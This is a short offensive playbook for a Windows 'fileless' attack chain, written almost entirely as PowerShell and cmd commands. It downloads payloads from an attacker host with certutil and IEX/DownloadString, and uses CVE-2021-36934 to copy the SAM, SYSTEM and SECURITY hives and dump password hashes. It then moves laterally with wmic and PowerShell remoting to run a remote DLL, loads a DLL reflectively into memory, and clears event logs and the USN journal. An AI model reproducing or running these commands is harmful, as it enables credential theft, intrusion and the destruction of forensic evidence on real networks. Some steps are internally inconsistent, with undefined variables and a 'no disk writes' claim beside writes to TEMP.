
# 🧨 NSFW Fileless Exploitation Chain (Reflective DLL + LOLBins)

## 🔹 Step 1: Staging Payload via Certutil (in-memory)
```powershell
$payload = "$env:TEMP\nsfw.jpg"
certutil -urlcache -split -f "http://attacker-ip/nsfw.jpg" $payload
```

## 🔹 Step 2: Decompress & Extract In-Memory (No Disk Writes)
```powershell
Add-Type -Assembly "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::ExtractToDirectory($payload, "$env:TEMP\stage")
```

## 🔹 Step 3: Trigger CVE-2021-36934 (SeriousSAM)
```powershell
Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" "$env:TEMP\SAM"
Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "$env:TEMP\SYSTEM"
Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" "$env:TEMP\SECURITY"
```

## 🔹 Step 4: Hash Dumping Filelessly (SecretsDump via RAM Execution)
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://attacker-ip/secretsdump.ps1")
Invoke-SecretsDump -System $system -Security $security -Sam $sam
```

## 🔹 Step 5: Lateral Movement (Pure Fileless)
### ✅ Option 1: `wmic.exe`
```cmd
wmic /node:"192.168.1.10" /user:"admin" /password:"hash_or_pw" process call create "rundll32.exe \\attacker\share\nsfw.dll,#1"
```
### ✅ Option 2: `PowerShell Remoting`
```powershell
Invoke-Command -ScriptBlock { rundll32.exe \\attacker\share\nsfw.dll,#1 } -ComputerName 192.168.1.10 -Credential $cred
```

## 🔹 Step 6: Reflective DLL Injection (In Memory)
```powershell
IEX (New-Object Net.WebClient).DownloadString("http://attacker-ip/Invoke-ReflectivePEInjection.ps1")
Invoke-ReflectivePEInjection -PEUrl "http://attacker-ip/nsfw.dll" -FuncName "DllMain"
```

## 🔹 Step 7: Destruction & Evasion
```cmd
wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:
```
